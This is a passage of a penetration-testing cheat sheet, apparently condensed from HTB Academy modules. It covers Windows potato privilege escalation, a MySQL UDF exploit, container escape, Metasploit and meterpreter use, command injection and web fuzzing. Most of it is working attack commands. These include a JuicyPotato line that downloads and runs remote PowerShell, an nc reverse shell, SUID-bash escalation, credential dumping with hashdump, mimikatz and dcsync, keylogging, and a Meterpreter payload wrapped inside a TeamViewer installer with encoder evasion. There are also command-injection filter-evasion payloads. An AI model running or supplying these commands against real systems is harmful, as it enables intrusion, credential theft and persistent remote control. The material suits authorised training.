.\GodPotato-NET4.exe -cmd '<COMMAND>'
```

#### Juicy Potato LPE

> https://github.com/ohpe/juicy-potato

> http://ohpe.it/juicy-potato/CLSID/

##### GetCLSID.ps1

```shell
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```

**Execution**

```cmd
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
```

#### JuicyPotatoNG LPE

> https://github.com/antonioCoco/JuicyPotatoNG

```cmd
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

#### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE

> https://www.exploit-db.com/exploits/1518

```shell
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```shell
mysql -u root
```

```shell
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('chmod +s /bin/bash');
```

#### PrintSpoofer LPE

> https://github.com/itm4n/PrintSpoofer

```cmd
.\PrintSpoofer64.exe -i -c powershell
```

#### SharpEfsPotato LPE

> https://github.com/bugch3ck/SharpEfsPotato

```cmd
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### Shocker Container Escape

> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

##### Modifying Exploit

```shell
        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```

**Compiling**

```shell
gcc shocker.c -o shocker
cc -Wall -std=c99 -O2 shocker.c -static
```

## 17. Using the Metasploit Framework

> Condensed from HTB Academy **Using the Metasploit Framework** (module 39).

### MSFconsole Basics

```bash
msfconsole
msfconsole -q
```

```text
msf6 > help
msf6 > version
msf6 > show modules
msf6 > search <term>
msf6 > use <module>
msf6 > info
msf6 > options
msf6 > back
```

```shell
sudo msfdb run                   // start database
sudo msfdb init                  // database initialization
msfdb --use-defaults delete      // delete existing databases
msfdb --use-defaults init        // database initialization
msfdb status                     // database status
msf6 > workspace                   // metasploit workspaces
msf6 > workspace -a <WORKSPACE>    // add a workspace
msf6 > workspace -r <WORKSPACE>    // rename a workspace
msf6 > workspace -d <WORKSPACE>    // delete a workspace
msf6 > workspace -D                // delete all workspaces
msf6 > db_nmap <OPTIONS>           // execute nmap and add output to database
msf6 > hosts                       // reads hosts from database
msf6 > services                    // reads services from database
msf6 > vulns                       // displaying vulnerabilities
msf6 > search                      // search within metasploit
msf6 > set RHOST <RHOST>           // set remote host
msf6 > set RPORT <RPORT>           // set remote port
msf6 > run                         // run exploit
msf6 > spool /PATH/TO/FILE         // recording screen output
msf6 > save                        // saves current state
msf6 > exploit                     // using module exploit
msf6 > payload                     // using module payload
msf6 > auxiliary                   // using module auxiliary
msf6 > encoder                     // using module encoder
msf6 > nop                         // using module nop
msf6 > show sessions               // displays all current sessions
msf6 > sessions -i 1               // switch to session 1
msf6 > sessions -u <ID>            // upgrading shell to meterpreter
msf6 > sessions -k <ID>            // kill specific session
msf6 > sessions -K                 // kill all sessions
msf6 > jobs                        // showing all current jobs
msf6 > show payloads               // displaying available payloads
msf6 > set VERBOSE true            // enable verbose output
msf6 > set forceexploit true       // exploits the target anyways
msf6 > set EXITFUNC thread         // reverse shell can exit without exit the program
msf6 > set AutoLoadStdapi false    // disables autoload of stdapi
msf6 > set PrependMigrate true     // enables automatic process migration
msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > loadstdapi                         // load stdapi
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > search -f <FILE>                   // search for a file
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load powershell                    // loads powershell
meterpreter > powershell_shell                   // follow-up command for load powershell
meterpreter > powershell_execute                 // execute command
meterpreter > powershell_import                  // import module
meterpreter > powershell_session_remove          // remove
meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                                // network discovery
meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter > load kiwi                          // load mimikatz
meterpreter > help kiwi                          // mimikatz help
meterpreter > kiwi_cmd                           // execute mimikatz native command
meterpreter > lsa_dump_sam                       // lsa sam dump
meterpreter > dcsync_ntlm krbtgt                 // dc sync
meterpreter > creds_msv                          // msv dump
meterpreter > creds_kerberos                     // kerberos dump
meterpreter > creds_ssp                          // ssp dump
meterpreter > creds_wdigest                      // wdigest dump
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```

#### Metasploit through Proxychains

```shell
proxychains -q msfconsole
```

#### Auxiliary Output Directory

```shell
/home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```

#### Meterpreter Listener

#### Generate Payload

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```

#### Setup Listener for Microsoft Windows

```shell
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

#### Download Files

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
```

```cmd
.\<FILE>.exe
```

```shell
meterpreter > download *
```

### Modules, Targets, and Payloads

```text
msf6 > search eternalromance
msf6 > search eternalromance type:exploit
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

msf6 > use 0
msf6 > show options
msf6 > show targets
msf6 > set target <ID>
msf6 > show payloads
msf6 > set payload <PAYLOAD>
msf6 > set RHOSTS <TARGET_IP>
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT <PORT>
msf6 > check
msf6 > run
msf6 > exploit
```

Use `setg` for global options and `unsetg` to clear them:

```text
msf6 > setg RHOSTS <TARGET_IP>
msf6 > setg LHOST <ATTACKER_IP>
msf6 > unsetg RHOSTS
```

Filtering payloads:

```text
msf6 > grep meterpreter show payloads
msf6 > grep -c meterpreter show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```

### Encoders and Evasion

```text
msf6 > show encoders
msf6 > set encoder <ENCODER>
msf6 > set EnableStageEncoding true
```

```bash
# Legacy pipeline (msfpayload/msfencode)
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
  msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

# Modern msfvenom
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Encoders are not a substitute for testing against the target's AV/EDR. Check payloads with `msf-virustotal` using your own API key.

### Database and Workspaces

```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
sudo msfdb run
```

```text
msf6 > db_status
msf6 > workspace
msf6 > workspace -a <ENGAGEMENT>
msf6 > workspace <ENGAGEMENT>
msf6 > db_nmap -sV -sS <TARGET_IP>
msf6 > hosts
msf6 > services
msf6 > creds
msf6 > loot
msf6 > db_import <SCAN_FILE>.xml
msf6 > db_export -f xml backup.xml
```

### Sessions and Jobs

```text
msf6 > sessions
msf6 > sessions -i <ID>
msf6 > jobs
msf6 > jobs -l
msf6 > exploit -j
```

### Meterpreter

```text
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > steal_token <PID>
meterpreter > getuid
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > shell
meterpreter > background
```

Local privilege escalation workflow:

```text
msf6 > search local_exploit_suggester
msf6 > use 0
msf6 > set SESSION <ID>
msf6 > run
msf6 > use exploit/windows/local/<MODULE>
msf6 > set SESSION <ID>
msf6 > set LHOST <ATTACKER_IP>
msf6 > run
meterpreter > getuid
```

### Plugins & Mixins

```text
msf6 > ls /usr/share/metasploit-framework/plugins/
msf6 > load nessus
msf6 > nessus_help
msf6 > load pentest
msf6 > help
```

Plugins extend MSFconsole with new commands and integrations. User plugins can be placed in `~/.msf4/plugins/` and loaded with `load <name>`. Mixins are Ruby modules used when writing custom Metasploit modules.

### Writing and Importing Modules

```bash
ls /usr/share/metasploit-framework/modules
ls ~/.msf4/modules
cp <MODULE>.rb /usr/share/metasploit-framework/modules/exploits/<PATH>/
```

```text
msf6 > reload_all
msf6 > loadpath /usr/share/metasploit-framework/modules/
msf6 > use <MODULE>
```

### MSFvenom and Handlers

```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f exe -o shell.exe

# ASPX payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f aspx > reverse_shell.aspx
```

```text
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 1337
msf6 > run
```

### Wrapping and Packing

```bash
# Embed a payload in a legitimate executable
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 \
  -k -x TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows \
  -o TeamViewer_Setup_payload.exe -i 5

# Optional archive wrapping (not encryption)
rar a payload.rar -p payload.js
```

### References

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Metasploit documentation](https://docs.rapid7.com/metasploit/)

## 18. Using Web Proxies

> Condensed from HTB Academy **Using Web Proxies** (module 110). Burp Suite and ZAP are GUI-driven; this section records the setup and the command-line integration points.

### Proxy Setup

1. Start Burp or ZAP and confirm the proxy listener (default `127.0.0.1:8080`).
2. Point Firefox at the proxy, or use the tool's pre-configured browser.
3. Install the proxy's CA certificate and trust it for websites.
4. Verify HTTPS interception works before testing.

Burp: `Proxy > Proxy settings > Proxy listeners`.
ZAP: `Tools > Options > Network > Local Servers/Proxies`.

```shell
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

### Core Workflow

- **Intercept** — pause, inspect, and modify requests/responses.
- **Repeater** — resend a request with manual changes; useful for auth, IDOR, injection.
- **Intruder / Fuzzer** — automate payload positions, wordlists, and attack types.
- **Scanner** — active/passive checks; validate findings manually.
- **Extensions** — install only from trusted sources.

### Burp/ZAP Feature Map

| Feature | Burp Suite | ZAP |
|---|---|---|
| Intercept requests/responses | Proxy > Intercept | Break / Proxy |
| Repeat and edit a request | Repeater | Requester |
| Automated fuzzing | Intruder | Fuzzer |
| Automated scanning | Scanner | Active/Passive Scan |
| Encode/decode | Decoder | Encoder/Decoder |
| Compare responses | Comparer | Diff |
| Automatic header/body changes | Match and Replace | Replacer |
| Extensions | BApp Store | ZAP Add-ons |

Use **Intercept** to inspect and modify traffic, **Repeater/Requester** for manual testing, **Intruder/Fuzzer** for payload positions and wordlists, and **Scanner** for baseline checks. Validate scanner output manually.

### Proxying Command-Line Tools

`proxychains`:

```bash
# /etc/proxychains.conf
# socks4 127.0.0.1 9050
http 127.0.0.1 8080
```

```bash
proxychains -q curl http://<TARGET>
```

Nmap (experimental):

```bash
nmap -h | grep -i prox
nmap --proxies http://127.0.0.1:8080 <TARGET_IP> -p<PORT> -Pn -sC
```

Metasploit:

```text
msf6 > use auxiliary/scanner/http/robots_txt
msf6 > set PROXIES HTTP:127.0.0.1:8080
msf6 > set RHOST <TARGET_IP>
msf6 > set RPORT <PORT>
msf6 > run
```

Other tools: set `HTTP_PROXY`/`HTTPS_PROXY` where supported, or use the tool's `--proxy`/`-x` flag. Proxy only when inspecting traffic; it slows tools down.

### Useful Burp/ZAP Features

- Match/replace rules for automatic header or parameter changes.
- Scope and target filtering to avoid noise.
- Decoder for URL/base64/hex transformations.
- Comparer for response diffing.
- Save project files and export findings.

## 19. Command Injections

> Condensed from HTB Academy **Command Injections** (module 109).

### Detection

Identify inputs that reach OS commands (for example a Host Checker running `ping -c 1 <INPUT>`). Try appending an operator and a harmless command; a change in output indicates injection.

| Operator | Character | URL-encoded | Behavior |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands |
| New line | `\n` | `%0a` | Both commands |
| Background | `&` | `%26` | Both commands |
| Pipe | `\|` | `%7c` | Both, only second output |
| AND | `&&` | `%26%26` | Both, if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second, if first fails |
| Sub-shell | \` | `%60%60` | Both (Linux) |
| Sub-shell | `$()` | `%24%28%29` | Both (Linux) |

### Basic Exploitation

```bash
# Local validation
ping -c 1 127.0.0.1; whoami
ping -c 1 127.0.0.1 && whoami
ping -c 1 127.0.0.1 || whoami
ping -c 1 || whoami
```

If front-end validation blocks the payload, intercept the request in Burp/ZAP, URL-encode the payload (`Ctrl+U` in Burp), and send it directly to the back end.

```http
POST /check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3b+whoami
```

### Filter Evasion

**Spaces:**

```bash
cat</etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
```

**Blacklisted characters:**

```bash
echo ${PATH}
echo ${PATH:0:1}          # /
echo ${LS_COLORS:10:1}    # ;
echo %HOMEPATH:~6,-11%    # Windows
$env:HOMEPATH[0]          # PowerShell
```

Build characters from variables or use encoding/`tr` to avoid literal blacklist entries.

**Blacklisted commands:**

```bash
who^ami                    # Windows CMD
w'h'o'a'm'i                # shell quote insertion
w\h\o\a\m\i                # backslash insertion
"whoami"
```

**Case and string manipulation:**

```bash
WhOaMi
echo 'whoami' | rev
"whoami"[-1..-20] -join ''            # PowerShell
iex "$('imaohw'[-1..-20] -join '')"  # PowerShell
```

**Base64 and encoding:**

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# PowerShell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### Obfuscation Tools

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

### Blind / Out-of-Band Checks

- Use time delays (`sleep`, `ping -c`) to confirm execution when output is not returned.
- Use an HTTP/DNS callback to a host you control.
- URL-encode payloads and test each operator separately.

### Prevention

- Avoid passing user input to shell commands; use language APIs and allowlists.
- Validate input against a strict pattern (for example an IP address regex).
- Escape shell metacharacters and use parameterized APIs.
- Run services with least privilege and disable unnecessary shell functions.
- Use a WAF as defense in depth, not as the only control.

## 20. Attacking Web Applications with Ffuf

> Condensed from HTB Academy **Attacking Web Applications with Ffuf** (module 54).

### Directory and Page Fuzzing

```bash
# Basic directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<TARGET>/FUZZ

# Discover extensions for a known page
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://<TARGET>/blog/indexFUZZ

# Discover pages with a known extension
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<TARGET>/blog/FUZZ.php

# Recursive fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<TARGET>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

#### Common Commands

```shell
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST>/ -ac
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST>/ -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

#### Using a Request File

```shell
ffuf -request <FILE> -w /usr/share/wordlists/dirb/common.txt
```

#### API Fuzzing

```shell
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

#### Searching for LFI

```shell
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

#### Fuzzing with PHP Session ID

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

#### Recursion

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
```

#### File Extensions

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
```

#### Rate Limiting

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
```

#### Virtual Host Discovery

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -ac
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
```

#### Massive File Extension Discovery

```shell
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

```shell
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
--wildcard    // set wildcard option

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

#### Common File Extensions

```shell
txt,bak,php,html,js,asp,aspx
```

#### Common Picture Extensions

```shell
png,jpg,jpeg,gif,bmp
```

#### POST Requests

```shell
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

#### DNS Recon

```shell
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

#### VHost Discovery

```shell
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

#### Specifiy User Agent

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

### Domain and Vhost Fuzzing

```bash
# Subdomain fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u https://FUZZ.<DOMAIN>/

# Virtual-host fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>'

# Filter out the default response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>
```

Add discovered hosts to `/etc/hosts`:

```bash
sudo sh -c 'echo "<TARGET_IP>  <VHOST>.<DOMAIN>" >> /etc/hosts'
```

### Parameter and Value Fuzzing

```bash
# GET parameter names
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://<TARGET>/admin.php?FUZZ=key" -fs <SIZE>

# POST parameter names
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u http://<TARGET>/admin.php -X POST -d 'FUZZ=key' \
  -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>

# Value fuzzing
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u http://<TARGET>/admin.php -X POST -d 'id=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>
```

### Result Filters

| Flag | Effect |
|---|---|
| `-fs <size>` | Filter by response size |
| `-fc <code>` | Filter by status code |
| `-fw <words>` | Filter by word count |
| `-fl <lines>` | Filter by line count |
| `-fr <regex>` | Filter by response regex |
| `-mc <code>` | Match status code |
| `-mr <regex>` | Match response regex |

Use `ffuf -h` for the full option list. Save output with `-o results.json -of json`.

### wfuzz

```shell
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

#### Write to File

```shell
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

#### Custom Scan with limited Output

```shell
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/<NTLM_HASH>/db/file_FUZZ.txt --sc 200 -t 20
```

#### Fuzzing two Parameters at once

```shell
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

#### Domain

```shell
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

#### Subdomain

```shell
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

#### Git

```shell
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```

#### Login

```shell
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST> --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST> --ss "Invalid login"
```

#### SQL

```shell
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

#### DNS

```shell
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

#### Numbering Files

```shell
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

#### Enumerating PIDs

```shell
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

### URL Brute Forcing

```
# Ffuf
ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.11.1.11/mvc/FUZZ

# Dirb not recursive
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# Wfuzz
